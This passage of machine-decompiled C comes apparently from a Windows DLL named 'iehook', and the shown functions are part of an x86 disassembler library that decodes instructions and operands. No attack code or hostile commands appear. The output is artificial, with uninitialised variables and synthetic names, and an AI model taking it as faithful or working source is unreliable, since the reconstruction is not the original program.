    *(int32_t *)(v41 - 8) = v38 + v17;
    v37 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173);
    goto lab_0x10001c61;
  lab_0x10001c67:
    // 0x10001c67
    *(char *)(v17 + (int32_t)v121) = 93;
    *v16 = *v16 + 1;
    // 0x10001c79
    return result3;
  lab_0x10001c61:;
    char v143 = *v16 + (char)v37; // 0x10001c61
    *v16 = v143;
    v121 = v143;
    result3 = v37;
    goto lab_0x10001c67;
  lab_0x10001bb3:
    // 0x10001bb3
    *(int32_t *)(v44 - 4) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
    *(int32_t *)(v44 - 8) = (int32_t)&g3;
    int32_t v144 = __wassert(); // 0x10001bbd
    v121 = *v16;
    result3 = v144;
    goto lab_0x10001c67;
  lab_0x1000173a:
    // 0x1000173a
    *v79 = v94;
    *v80 = v96 + v17;
    v95 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173);
    goto lab_0x1000174b;
  lab_0x10001477:;
    int32_t v146 = __snprintf((char *)(v17 + v28), v39, v32, (int32_t)v31); // 0x10001480
    char v147 = *v16 + (char)v146; // 0x10001488
    *v16 = v147;
    v33 = v147;
    v42 = 0;
    goto lab_0x10001497;
  lab_0x1000190e:;
    int32_t v148 = __snprintf((char *)(v17 + v28), v40, v34, (int32_t)v45); // 0x10001917
    char v149 = *v16 + (char)v148; // 0x1000191f
    *v16 = v149;
    v35 = v149;
    v43 = 0;
    goto lab_0x1000192e;
  lab_0x1000174b:;
    char v145 = *v16 + (char)v95; // 0x1000174b
    *v16 = v145;
    v93 = v145;
    result = v95;
    goto lab_0x10001751;
}

// Address range: 0x10001c80 - 0x10001d66
int32_t function_10001c80(int32_t a1, int32_t a2, int32_t a3) {
    // 0x10001c80
    if ((*(char *)(a1 + 774) & 4) == 0) {
        // 0x10001c92
        __wassert();
    }
    int32_t v1 = a2 + 6; // 0x10001cac
    if ((*(char *)v1 & 1) != 0) {
        // 0x10001cb2
        __wassert();
    }
    int16_t * v2 = (int16_t *)v1; // 0x10001cc9
    *v2 = *v2 / 2;
    char * v3 = (char *)(a1 + 264); // 0x10001ccd
    int32_t v4 = a1 + 8;
    *(char *)(v4 + (int32_t)*v3) = 40;
    *v3 = *v3 + 1;
    function_10001260(a1, a2, a3);
    unsigned char v5 = *v3; // 0x10001cea
    int32_t v6 = v5; // 0x10001cea
    int32_t v7 = __snprintf((char *)(v4 + v6), v5 == -1 ? 0 : 256 - v6, ", "); // 0x10001d13
    *v3 = *v3 + (char)v7;
    int32_t * v8 = (int32_t *)(a1 + 784); // 0x10001d23
    uint32_t v9 = *v8; // 0x10001d23
    uint32_t v10 = v9 + (int32_t)*v2; // 0x10001d23
    *v8 = v10;
    int32_t * v11 = (int32_t *)(a1 + 788); // 0x10001d2b
    *v11 = *v11 + (int32_t)(v10 < v9);
    function_10001260(a1, a2, a3);
    uint32_t result = (int32_t)*v2; // 0x10001d37
    uint32_t v12 = *v8; // 0x10001d3f
    *v8 = v12 - result;
    *v11 = *v11 - (int32_t)(v12 < result);
    *(char *)(v4 + (int32_t)*v3) = 41;
    *v3 = *v3 + 1;
    *v2 = 2 * *v2;
    return result;
}

// Address range: 0x10001d70 - 0x10001df9
int32_t function_10001d70(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    char v1 = *(char *)(a1 + 774); // 0x10001d7a
    if ((v1 & 2) != 0) {
        // 0x10001d84
        if ((int32_t)(*(char *)(a1 + 775) & 3) == a3) {
            // 0x10001da7
            return function_10001260(a1, a2, a3);
        }
    }
    if ((v1 & 4) != 0) {
        // 0x10001d96
        if ((int32_t)(*(char *)(a1 + 775) / 4 & 3) == a3) {
            // 0x10001da7
            return function_10001260(a1, a2, a3);
        }
    }
    char * v2 = (char *)(a1 + 264); // 0x10001db8
    unsigned char v3 = *v2; // 0x10001db8
    int32_t v4 = v3; // 0x10001db8
    int32_t v5 = v3 == -1 ? 0 : 256 - v4;
    int32_t v6 = *(int32_t *)(a2 + 16); // 0x10001dd4
    int32_t v7 = *(int32_t *)(4 * v6 + (int32_t)&g68); // 0x10001dd7
    int32_t result = __snprintf((char *)(a1 + 8 + v4), v5, (char *)v7); // 0x10001de8
    *v2 = *v2 + (char)result;
    return result;
}

// Address range: 0x10001e00 - 0x10001e3b
int32_t function_10001e00(int32_t a1, int32_t a2, int32_t a3) {
    // 0x10001e00
    if ((*(char *)(a1 + 774) & 6) == 0) {
        // 0x10001e10
        __wassert();
    }
    // 0x10001e27
    return function_10001260(a1, a2, a3);
}

// Address range: 0x10001e40 - 0x10001e77
int32_t function_10001e40(int32_t a1, int32_t a2, int32_t a3) {
    // 0x10001e40
    int32_t v1; // 0x10001e40
    return function_10001d70(a1, a2, a3, v1);
}

// Address range: 0x10001e80 - 0x10001ebb
int32_t function_10001e80(int32_t a1, int32_t a2, int32_t a3) {
    // 0x10001e80
    if ((*(char *)(a1 + 774) & 6) == 0) {
        // 0x10001e90
        __wassert();
    }
    // 0x10001ea7
    return function_10001260(a1, a2, a3);
}

// Address range: 0x10001ec0 - 0x10001efb
int32_t function_10001ec0(int32_t a1, int32_t a2, int32_t a3) {
    // 0x10001ec0
    if ((*(char *)(a1 + 774) & 6) == 0) {
        // 0x10001ed0
        __wassert();
    }
    // 0x10001ee7
    return function_10001260(a1, a2, a3);
}

// Address range: 0x10001f00 - 0x10001f3b
int32_t function_10001f00(int32_t a1, int32_t a2, int32_t a3) {
    // 0x10001f00
    if ((*(char *)(a1 + 774) & 4) == 0) {
        // 0x10001f10
        __wassert();
    }
    // 0x10001f27
    return function_10001260(a1, a2, a3);
}

// Address range: 0x10001f40 - 0x10001f7b
int32_t function_10001f40(int32_t a1, int32_t a2, int32_t a3) {
    // 0x10001f40
    if ((*(char *)(a1 + 774) & 4) == 0) {
        // 0x10001f50
        __wassert();
    }
    // 0x10001f67
    return function_10001260(a1, a2, a3);
}

// Address range: 0x10001f80 - 0x10001f9a
int32_t function_10001f80(void) {
    // 0x10001f80
    __wassert();
    return 0;
}

// Address range: 0x10001fa0 - 0x1000247f
int32_t function_10001fa0(int32_t result, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    // 0x10001fa0
    int32_t v1; // 0x10001fa0
    if (*(char *)(v1 + 744) != 0) {
        // 0x10001fba
        __wassert();
    }
    uint32_t v2 = (int32_t)*(char *)(v1 + 742); // 0x10001fab
    int32_t v3 = v2 & 3; // 0x10001fd6
    int32_t v4; // 0x10001fa0
    if (v3 == 3) {
        // 0x10001fde
        switch (*(int16_t *)(v4 + 6)) {
            case 1: {
                // 0x10002041
                *(int32_t *)v4 = v4 | 128;
                *(int32_t *)(v4 + 16) = v2 / 32 | 112;
                return result;
            }
            case 2: {
                // 0x10002027
                *(int32_t *)v4 = v4 | 128;
                *(int32_t *)(v4 + 16) = v2 / 32 | 128;
                return result;
            }
            case 4: {
                // 0x1000200b
                *(int32_t *)v4 = v4 | 128;
                *(int32_t *)(v4 + 16) = v2 / 32 | 144;
                return result;
            }
        }
        // 0x10001fed
        __wassert();
        return 0;
    }
    // 0x1000205b
    int32_t v5; // bp-12, 0x10001fa0
    int32_t v6 = &v5; // 0x10001fb1
    if (v3 == 0) {
        if ((v2 & 224) == 192) {
            int32_t v7 = (int32_t)*(int16_t *)result; // 0x10002074
            *(int32_t *)(v1 + 784) = v7;
            *(int32_t *)(v1 + 788) = v7 >> 31;
            if ((v4 & 0x4000) != 0) {
                char * v8 = (char *)(v1 + 774); // 0x10002154
                char v9 = *v8; // 0x10002154
                char v10 = v9; // 0x1000215b
                if ((v9 & 2) != 0) {
                    // 0x1000215d
                    *(int32_t *)(v6 - 4) = 0x1037;
                    *(int32_t *)(v6 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                    *(int32_t *)(v6 - 12) = (int32_t)L"!X86Instruction->HasDstAddressing";
                    __wassert();
                    v10 = *v8;
                }
                char * v11 = (char *)(v1 + 775); // 0x10002174
                *v8 = v10 | 2;
                char v12 = a2; // 0x10002188
                *(char *)(v1 + 759 + (int32_t)(*v11 / 16 & 3)) = v12;
                char v13 = *v11; // 0x1000218f
                *v11 = v13 & -52 | v12 & 3 | v13 + 16 & 48;
            }
            int32_t * v14; // 0x1000222b
            if ((v4 & 0x2000) == 0) {
                // 0x10002220
                *(int32_t *)v4 = v4 | 0x10000;
                v14 = (int32_t *)(v1 + 296);
                *v14 = *v14 + 2;
                return result + 2;
            }
            char * v15 = (char *)(v1 + 774);
            if (*(int32_t *)(v1 + 284) != 0x4001) {
                // 0x100021c4
                if ((*v15 & 4) != 0) {
                    // 0x100021cd
                    *(int32_t *)(v6 - 4) = 0x1037;
                    *(int32_t *)(v6 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                    *(int32_t *)(v6 - 12) = (int32_t)L"!X86Instruction->HasSrcAddressing";
                    __wassert();
                }
            }
            char * v16 = (char *)(v1 + 775); // 0x100021e4
            *v15 = *v15 | 4;
            char v17 = a2; // 0x100021f5
            *(char *)(((int32_t)(*v16 / 64) | 756) + v1) = v17;
            char v18 = *v16; // 0x100021fc
            *v16 = v18 & 51 | 4 * v17 & 12 | v18 + 64 & -64;
            // 0x10002220
            *(int32_t *)v4 = v4 | 0x10000;
            v14 = (int32_t *)(v1 + 296);
            *v14 = *v14 + 2;
            return result + 2;
        }
    }
    int32_t v19 = v3 - 1; // 0x10002244
    int32_t result2; // 0x10001fa0
    int32_t v20; // 0x10001fa0
    if (v19 == 0) {
        int32_t v21 = (int32_t)*(char *)result; // 0x10002282
        *(int32_t *)(v1 + 784) = v21;
        *(int32_t *)(v1 + 788) = v21 >> 31;
        v20 = 1;
        goto lab_0x10002297;
    } else {
        // 0x10002247
        result2 = result;
        if (v19 != 1) {
            goto lab_0x100022a0;
        } else {
            int32_t v22 = (int32_t)*(int16_t *)result; // 0x1000224d
            *(int32_t *)(v1 + 784) = v22;
            *(int32_t *)(v1 + 788) = v22 >> 31;
            v20 = 2;
            goto lab_0x10002297;
        }
    }
  lab_0x10002297:;
    int32_t * v23 = (int32_t *)(v1 + 296); // 0x10002297
    *v23 = *v23 + v20;
    result2 = v20 + result;
    goto lab_0x100022a0;
  lab_0x100022a0:;
    int32_t v24 = v2 / 32; // 0x1000223c
    g149 = v24;
    switch (v24) {
        case 0: {
            // 0x100022af
            *(int32_t *)(v1 + 768) = 134;
            goto lab_0x100022b9;
        }
        case 1: {
            // 0x100023b4
            *(int32_t *)(v1 + 768) = 135;
            goto lab_0x100022b9;
        }
        case 2: {
            char * v25 = (char *)(v1 + 774); // 0x100023c3
            *v25 = *v25 | 32;
            *(int32_t *)(v1 + 764) = 133;
            *(int32_t *)(v1 + 768) = 134;
            if ((*(char *)(v1 + 773) & 8) != 0) {
                goto lab_0x100022ca;
            } else {
                // 0x100023eb
                if ((*(char *)(v1 + 777) & 2) == 0) {
                    // 0x1000240b
                    *(int32_t *)(v1 + 752) = 2;
                    goto lab_0x100022ca;
                } else {
                    // 0x100023f9
                    __wassert();
                    // 0x1000240b
                    *(int32_t *)(v1 + 752) = 2;
                    goto lab_0x100022ca;
                }
            }
        }
        case 3: {
            char * v26 = (char *)(v1 + 774); // 0x1000241a
            *v26 = *v26 | 32;
            *(int32_t *)(v1 + 764) = 133;
            *(int32_t *)(v1 + 768) = 135;
            if ((*(char *)(v1 + 773) & 8) != 0) {
                goto lab_0x100022ca;
            } else {
                // 0x10002442
                if ((*(char *)(v1 + 777) & 2) == 0) {
                    // 0x1000240b
                    *(int32_t *)(v1 + 752) = 2;
                    goto lab_0x100022ca;
                } else {
                    // 0x100023f9
                    __wassert();
                    // 0x1000240b
                    *(int32_t *)(v1 + 752) = 2;
                    goto lab_0x100022ca;
                }
            }
        }
        case 4: {
            // 0x10002452
            *(int32_t *)(v1 + 764) = 134;
            goto lab_0x100022ca;
        }
        case 5: {
            // 0x10002461
            *(int32_t *)(v1 + 764) = 135;
            goto lab_0x100022ca;
        }
        case 6: {
            // 0x10002470
            *(int32_t *)(v1 + 764) = 133;
            goto lab_0x100022ca;
        }
        case 7: {
            // 0x100022c0
            *(int32_t *)(v1 + 764) = 131;
            goto lab_0x100022ca;
        }
        default: {
            // 0x100022ca5
            // UNREACHABLE
        }
    }
  lab_0x100022b9:;
    char * v27 = (char *)(v1 + 774); // 0x100022b9
    *v27 = *v27 | 32;
    // 0x100022c0
    *(int32_t *)(v1 + 764) = 131;
    goto lab_0x100022ca;
  lab_0x100022ca:;
    char * v28 = (char *)(v1 + 774); // 0x100022ca
    *v28 = *v28 | 16;
    *(int32_t *)v4 = v4 | 0x10080;
    if ((v4 & 0x4000) != 0) {
        char v29 = *v28; // 0x100022df
        char v30 = v29; // 0x100022e6
        if ((v29 & 2) != 0) {
            // 0x100022e8
            __wassert();
            v30 = *v28;
        }
        char * v31 = (char *)(v1 + 775); // 0x100022ff
        *v28 = v30 | 2;
        char v32 = a2; // 0x10002313
        *(char *)(v1 + 759 + (int32_t)(*v31 / 16 & 3)) = v32;
        char v33 = *v31; // 0x1000231a
        *v31 = v33 & -52 | v32 & 3 | v33 + 16 & 48;
    }
    if ((v4 & 0x2000) == 0) {
        // 0x100023ac
        return result2;
    }
    // 0x10002344
    if (*(int32_t *)(v1 + 284) != 0x4001) {
        // 0x10002350
        if ((*v28 & 4) != 0) {
            // 0x10002359
            *(int32_t *)(v6 - 4) = 0x1087;
            *(int32_t *)(v6 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
            *(int32_t *)(v6 - 12) = (int32_t)L"!X86Instruction->HasSrcAddressing";
            __wassert();
        }
    }
    char * v34 = (char *)(v1 + 775); // 0x10002370
    *v28 = *v28 | 4;
    char v35 = a2; // 0x10002381
    *(char *)(((int32_t)(*v34 / 64) | 756) + v1) = v35;
    char v36 = *v34; // 0x10002388
    *v34 = v36 & 51 | 4 * v35 & 12 | v36 + 64 & -64;
    // 0x100023ac
    return result2;
}

// Address range: 0x100024c0 - 0x10002a5b
int32_t function_100024c0(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6) {
    int32_t v1 = 0x1000000 * a2 / 0x1000000;
    char * v2 = (char *)a1; // 0x100024c7
    int32_t v3; // 0x100024c0
    *(char *)(v3 + 740) = *v2;
    char * v4 = (char *)(v3 + 743); // 0x100024d0
    char v5 = *v4; // 0x100024d0
    unsigned char v6 = *v2 / 64; // 0x100024db
    char v7 = v6 | v5 & -4; // 0x100024de
    *v4 = v7;
    char v8 = (*v2 / 2 ^ v5) & 28 ^ v7; // 0x100024ef
    *v4 = v8;
    char v9 = 32 * *v2; // 0x100024f9
    unsigned char v10 = *(char *)(v3 + 745); // 0x10002500
    *v4 = v8 & 31 | v9;
    unsigned char v11 = ((v10 / 2 & 32 | v8 & 28) / 2 | v9) / 2 | v10 & -128; // 0x1000252c
    *(char *)(v3 + 747) = v11;
    int32_t v12; // 0x100024c0
    int32_t * v13 = (int32_t *)v12; // 0x10002534
    *v13 = v12 | 0x10000;
    if ((v12 & 0x4000) != 0) {
        char * v14 = (char *)(v3 + 774); // 0x10002543
        char v15 = *v14; // 0x10002543
        char v16 = v15; // 0x1000254a
        if ((v15 & 2) != 0) {
            // 0x1000254c
            __wassert();
            v16 = *v14;
        }
        char * v17 = (char *)(v3 + 775); // 0x10002566
        *v14 = v16 | 2;
        char v18 = v1; // 0x1000257d
        *(char *)(v3 + 759 + (int32_t)(*v17 / 16 & 3)) = v18;
        char v19 = *v17; // 0x10002584
        *v17 = v19 & -52 | v18 & 3 | v19 + 16 & 48;
    }
    if ((v12 & 0x2000) != 0) {
        char * v20 = (char *)(v3 + 774);
        if (*(int32_t *)(v3 + 284) != 0x4001) {
            // 0x100025bd
            if ((*v20 & 4) != 0) {
                // 0x100025c6
                __wassert();
            }
        }
        char * v21 = (char *)(v3 + 775); // 0x100025e0
        *v20 = *v20 | 4;
        *(char *)(((int32_t)(*v21 / 64) | 756) + v3) = (char)v1;
        char v22 = *v21; // 0x100025f8
        *v21 = v22 & 51 | 4 * (char)a2 & 12 | v22 + 64 & -64;
    }
    uint32_t v23 = (int32_t)v11; // 0x1000252c
    int32_t * v24 = (int32_t *)(v3 + 296); // 0x10002627
    *v24 = *v24 + 1;
    int32_t v25 = a1 + 1; // 0x1000262d
    int32_t result; // 0x100024c0
    if (v9 != -96) {
        // 0x100028db
        int32_t v26; // 0x100024c0
        unsigned char v27; // 0x100028db
        switch (v27 / 16) {
            case 4: {
                int32_t v28 = v23 / 16 | 144; // 0x10002921
                int32_t * v29 = (int32_t *)(v12 + 16);
                *v29 = v28;
                v26 = v28;
                if (*(int32_t *)(*(int32_t *)(v3 + 4) + 4) == 3) {
                    int32_t v30 = v28 + 48; // 0x10002932
                    *v29 = v30;
                    v26 = v30;
                }
                // break -> 0x10002938
                break;
            }
            case 8: {
                int32_t v31 = v23 / 16 | 208; // 0x10002910
                *(int32_t *)(v12 + 16) = v31;
                v26 = v31;
                // break -> 0x10002938
                break;
            }
            default: {
                // 0x100028ec
                __wassert();
                return 0;
            }
        }
        char * v32 = (char *)(v3 + 774); // 0x1000293b
        *v32 = *v32 | 16;
        *(int32_t *)(v3 + 764) = v26;
        if ((*(char *)(v3 + 773) & 8) == 0) {
            if ((v23 & 240) != 80 != (v23 & 240) != 64) {
                // 0x1000295e
                if ((*(char *)(v3 + 777) & 2) != 0) {
                    // 0x10002967
                    __wassert();
                }
                // 0x10002981
                *(int32_t *)(v3 + 752) = 2;
            }
        }
        // 0x1000298b
        *v13 = v12 | 128;
        result = v25;
        goto lab_0x10002991;
    } else {
        char v33 = *(char *)(v3 + 742) & 3;
        switch (v33) {
            case 0: {
                uint32_t v34 = *(int32_t *)v25; // 0x100027ee
                int32_t * v35 = (int32_t *)(v3 + 784); // 0x100027f1
                *v35 = v34;
                int32_t * v36 = (int32_t *)(v3 + 788); // 0x100027f7
                *v36 = v34 / 0x80000000;
                if (v34 >= 0x10000 && v34 < 0x7fff0000) {
                    char * v37 = (char *)(v3 + 774); // 0x10002813
                    *v37 = *v37 | 64;
                    if ((*(char *)(v3 + 777) & 2) == 0) {
                        int32_t v38 = v3 + 752; // 0x10002868
                        int32_t v39 = *(int32_t *)v38; // 0x10002868
                        g150 = v39;
                        switch (v39) {
                            case 0: {
                            }
                            case 1: {
                            }
                            case 2: {
                            }
                            case 3: {
                                // 0x1000287a
                                *(int32_t *)(v12 + 8) = *v35;
                                *(int32_t *)(v12 + 12) = *v36;
                                // break -> 0x100028bf
                                break;
                            }
                            case 4: {
                            }
                            case 5: {
                                int32_t v40 = function_10001000((int32_t)*(char *)v38, v34); // 0x10002897
                                *(int32_t *)(v12 + 8) = v40;
                                *(int32_t *)(v12 + 12) = v40 >> 31;
                                // break -> 0x100028bf
                                break;
                            }
                            default: {
                                // 0x100028a8
                                __wassert();
                                // break -> 0x100028bf
                                break;
                            }
                        }
                    } else {
                        char * v41 = (char *)(v3 + 916); // 0x10002823
                        char v42 = *v41; // 0x10002823
                        if ((v42 & 16) == 0) {
                            char v43 = v42; // 0x10002834
                            if (a3 == 0) {
                                uint32_t v44 = *(int32_t *)(v3 + 288); // 0x1000283d
                                int32_t v45 = *(int32_t *)(v3 + 272) + v44; // 0x10002844
                                int32_t v46 = *(int32_t *)(v3 + 276); // 0x1000284a
                                _printf("[0x%08I64X] ANOMALY: unexpected segment 0x%02X\n", (int64_t)v45, v46 + v44 / 0x80000000 + (int32_t)(v45 < v44));
                                v43 = *v41;
                            }
                            // 0x1000285f
                            *v41 = v43 | 16;
                        }
                    }
                    // 0x100028bf
                    *v13 = v12 | 0x80000;
                }
                goto lab_0x100028c5;
            }
            case 1: {
                int32_t v47 = (int32_t)*(char *)v25; // 0x1000272f
                *(int32_t *)(v3 + 784) = v47;
                *(int32_t *)(v3 + 788) = v47 >> 31;
                if ((v23 & 240) != 80) {
                    // 0x100027c0
                    *(int32_t *)(v12 + 16) = 221;
                } else {
                    // 0x10002747
                    unsigned char v48; // 0x10002747
                    switch (v48 / 16) {
                        case 4: {
                            // 0x1000277f
                            *(int32_t *)(v12 + 16) = 149;
                            // break -> 0x10002786
                            break;
                        }
                        case 8: {
                            // 0x10002776
                            *(int32_t *)(v12 + 16) = 213;
                            // break -> 0x10002786
                            break;
                        }
                        default: {
                            // 0x10002758
                            __wassert();
                            return 0;
                        }
                    }
                    // 0x10002786
                    if ((*(char *)(v3 + 773) & 8) == 0) {
                        // 0x1000278f
                        if ((*(char *)(v3 + 777) & 2) != 0) {
                            // 0x10002798
                            __wassert();
                        }
                        // 0x100027b4
                        *(int32_t *)(v3 + 752) = 2;
                    }
                }
                char * v49 = (char *)(v3 + 774); // 0x100027ca
                *v49 = *v49 | 16;
                *(int32_t *)(v3 + 764) = *(int32_t *)(v12 + 16);
                *v13 = v12 | 128;
                *v24 = *v24 + 1;
                result = a1 + 2;
                goto lab_0x10002991;
            }
            default: {
                // 0x10002657
                result = v25;
                if (v33 != 2) {
                    goto lab_0x10002991;
                } else {
                    int32_t v50 = *(int32_t *)v25; // 0x1000265f
                    int32_t * v51 = (int32_t *)(v3 + 784); // 0x10002667
                    *v51 = v50;
                    *(int32_t *)(v3 + 788) = v50 >> 31;
                    if ((v23 & 240) != 80) {
                        // 0x100026ec
                        *(int32_t *)(v12 + 16) = 221;
                    } else {
                        // 0x10002678
                        unsigned char v52; // 0x10002678
                        switch (v52 / 16) {
                            case 4: {
                                // 0x100026b0
                                *(int32_t *)(v12 + 16) = 149;
                                // break -> 0x100026b7
                                break;
                            }
                            case 8: {
                                // 0x100026a7
                                *(int32_t *)(v12 + 16) = 213;
                                // break -> 0x100026b7
                                break;
                            }
                            default: {
                                // 0x10002689
                                __wassert();
                                return 0;
                            }
                        }
                        // 0x100026b7
                        if ((*(char *)(v3 + 773) & 8) == 0) {
                            // 0x100026c0
                            if ((*(char *)(v3 + 777) & 2) != 0) {
                                // 0x100026c9
                                __wassert();
                            }
                            // 0x100026e0
                            *(int32_t *)(v3 + 752) = 2;
                        }
                    }
                    uint32_t v53 = *v51; // 0x100026f3
                    char * v54; // 0x100024c0
                    char v55; // 0x100024c0
                    if (v53 < 0x10000 || v53 >= 0x7fff0000) {
                        char * v56 = (char *)(v3 + 774); // 0x10002717
                        v55 = *v56;
                        v54 = v56;
                    } else {
                        // 0x10002707
                        *v13 = v12 | 0x80000;
                        char * v57 = (char *)(v3 + 774);
                        char v58 = *v57 | 64; // 0x1000270d
                        *v57 = v58;
                        v55 = v58;
                        v54 = v57;
                    }
                    // 0x10002714
                    *v54 = v55 | 16;
                    *(int32_t *)(v3 + 764) = *(int32_t *)(v12 + 16);
                    *v13 = v12 | 128;
                    goto lab_0x100028c5;
                }
            }
        }
    }
  lab_0x10002991:;
    int32_t v59 = v23 & 15; // 0x10002993
    if (v59 == 4) {
        // 0x10002a54
        return result;
    }
    // 0x1000299f
    unsigned char v60; // 0x1000299f
    switch (v60 / 16) {
        case 4: {
            // 0x100029ef
            *(int32_t *)(v3 + 768) = v59 | 144;
            // break -> 0x10002a01
            break;
        }
        case 8: {
            // 0x100029dc
            *(int32_t *)(v3 + 768) = v59 | 208;
            // break -> 0x10002a01
            break;
        }
        default: {
            // 0x100029b0
            int32_t v61; // bp-12, 0x100024c0
            int32_t v62 = &v61; // 0x100024ec
            *(int32_t *)(v62 - 4) = ___iob_func() + 32;
            _fflush((struct _IO_FILE *)&g173);
            *(int32_t *)(v62 - 8) = 0x11c3;
            *(int32_t *)(v62 - 12) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
            *(int32_t *)(v62 - 16) = (int32_t)&g3;
            __wassert();
            return 0;
        }
    }
    // 0x10002a01
    *(int32_t *)(v12 + 8) = 0;
    *(int32_t *)(v12 + 12) = 0;
    char * v63 = (char *)(v3 + 774); // 0x10002a0d
    *v63 = *v63 | 32;
    int32_t v64 = v6; // 0x10002a14
    g151 = v64;
    switch (v64) {
        case 0: {
            // 0x10002a23
            *(char *)(v3 + 772) = 1;
            return result;
        }
        case 1: {
            // 0x10002a31
            *(char *)(v3 + 772) = 2;
            return result;
        }
        case 2: {
            // 0x10002a3f
            *(char *)(v3 + 772) = 4;
            return result;
        }
        case 3: {
            // 0x10002a4d
            *(char *)(v3 + 772) = 8;
            // break -> 0x10002a54
            break;
        }
        default: {
            // 0x10002a5410
            // UNREACHABLE
        }
    }
    // 0x10002a54
    return result;
  lab_0x100028c5:
    // 0x100028c5
    *v24 = *v24 + 4;
    result = a1 + 5;
    goto lab_0x10002991;
}

// Address range: 0x10002a90 - 0x10002b25
int32_t function_10002a90(int32_t a1, int32_t a2) {
    // 0x10002a90
    int32_t v1; // 0x10002a90
    unsigned char v2 = *(char *)(v1 + 776) & 15;
    if (v2 == 2) {
        int32_t v3 = *(int32_t *)(v1 + 272) + a1; // 0x10002aa7
        int16_t v4 = *(int16_t *)(v1 + 784); // 0x10002b0a
        return a1 - (v3 & 0xffff) + (int32_t)(v4 + (int16_t)v3);
    }
    switch ((int32_t)v2) {
        case 4: {
            // 0x10002afa
            return *(int32_t *)(v1 + 784) + a1;
        }
        case 8: {
            // 0x10002ae6
            return *(int32_t *)(v1 + 784) + a1;
        }
    }
    // 0x10002ac7
    __wassert();
    return 0;
}

// Address range: 0x10002b30 - 0x10002c1f
int32_t function_10002b30(int32_t a1) {
    int32_t v1 = 0x1000000 * a1 / 0x1000000;
    int32_t v2; // 0x10002b30
    int32_t v3; // 0x10002b30
    int32_t v4; // 0x10002b30
    if (v4 == 1) {
        char v5 = *(char *)((v3 & 255) + (int32_t)&g60); // 0x10002bad
        switch (v5) {
            case 0: {
                return 0;
            }
            case 1: {
                goto lab_0x10002bf6;
            }
            case 2: {
                if ((char)v2 == 0) {
                    // 0x10002bca
                    __wassert();
                }
                char v6 = *(char *)((v1 & 255) + (int32_t)&g62 + (8 * v2 & 2040)); // 0x10002be8
                if (v6 == 0) {
                    // 0x10002b6f
                    return 0;
                }
                goto lab_0x10002bf6;
            }
            default: {
                goto lab_0x10002b5d;
            }
        }
    } else {
        if (v4 >= 4) {
          lab_0x10002b5d:
            // 0x10002b5d
            __wassert();
            // 0x10002b6f
            return 0;
        }
        char v7 = *(char *)((v3 & 255) + (int32_t)&g61); // 0x10002b42
        switch (v7) {
            case 0: {
                return 0;
            }
            case 1: {
                goto lab_0x10002bf6;
            }
            case 2: {
                if ((char)v2 == 0) {
                    // 0x10002b77
                    __wassert();
                }
                char v8 = *(char *)((v1 & 255) + (int32_t)&g62 + (8 * v2 & 2040)); // 0x10002b95
                if (v8 == 0) {
                    // 0x10002b6f
                    return 0;
                }
                goto lab_0x10002bf6;
            }
            default: {
                goto lab_0x10002b5d;
            }
        }
    }
  lab_0x10002bf6:;
    // 0x10002bf6
    int32_t v9; // 0x10002b30
    char v10 = *(char *)(v9 + 94); // 0x10002bf6
    if ((v10 & 8) == 0) {
        // 0x10002b6f
        return 0;
    }
    // 0x10002c01
    if ((*(char *)(v9 + 62) & 3) != 3) {
        // 0x10002c10
        return (v10 & 2) != 0;
    }
    // 0x10002b6f
    return 0;
}

// Address range: 0x10002c20 - 0x10003452
int32_t function_10002c20(int32_t result2, int32_t a2, uint32_t a3, int32_t a4) {
    // 0x10002c20
    int32_t v1; // 0x10002c20
    char * v2 = (char *)(v1 + 776); // 0x10002c29
    unsigned char v3 = *v2; // 0x10002c29
    int32_t v4; // bp-24, 0x10002c20
    int32_t v5; // 0x10002c20
    int32_t v6; // 0x10002c20
    if ((v3 & -16) == 32) {
        // 0x10002c38
        v4 = a4;
        return function_10001fa0(result2, a3, a4, v5, v6);
    }
    unsigned char v7 = *(char *)(v1 + 742); // 0x10002c55
    unsigned char v8 = v7 & 3; // 0x10002c5d
    uint32_t v9 = (int32_t)*(char *)(v1 + 746); // 0x10002c60
    char * v10; // 0x10002c20
    char * v11; // 0x10002c20
    int32_t * v12; // 0x10002c20
    int32_t v13; // 0x10002c20
    int32_t v14; // 0x10002c20
    int32_t v15; // 0x10002c20
    int32_t v16; // 0x10002c20
    int32_t v17; // 0x10002c20
    int32_t * v18; // 0x10003418
    int32_t v19; // 0x10002c55
    int16_t * v20; // 0x10002c74
    int32_t v21; // 0x10002c5f
    int32_t * v22; // 0x10002dcc
    int32_t result3; // 0x10002dd5
    char * v23; // 0x10002e50
    if (v8 != 3) {
        // 0x10002db2
        v19 = v7;
        int32_t v24 = v19 & 224;
        if (v8 == 0 == v24 == 160) {
            // 0x10002dc6
            v21 = &v4;
            v22 = (int32_t *)a2;
            *v22 = *v22 | 0x10000;
            int32_t v25 = *(int32_t *)result2; // 0x10002dd2
            result3 = result2 + 4;
            int32_t * v26 = (int32_t *)(v1 + 784); // 0x10002dd8
            *v26 = v25;
            int32_t * v27 = (int32_t *)(v1 + 788); // 0x10002dde
            *v27 = v25 >> 31;
            int32_t * v28 = (int32_t *)(v1 + 296); // 0x10002de4
            *v28 = *v28 + 4;
            if (*(int32_t *)(*(int32_t *)(v1 + 4) + 4) != 3) {
                uint32_t v29 = *v26; // 0x10002fe6
                if (v29 >= 0x10000 && v29 < 0x7fff0000) {
                    // 0x10003002
                    if ((*(char *)(v1 + 777) & 2) == 0) {
                        int32_t v30 = v1 + 752; // 0x10003050
                        int32_t v31 = *(int32_t *)v30; // 0x10003050
                        g153 = v31;
                        switch (v31) {
                            case 0: {
                            }
                            case 1: {
                            }
                            case 2: {
                            }
                            case 3: {
                                // 0x10003062
                                *(int32_t *)(a2 + 8) = *v26;
                                *(int32_t *)(a2 + 12) = *v27;
                                // break -> 0x100030a7
                                break;
                            }
                            case 4: {
                            }
                            case 5: {
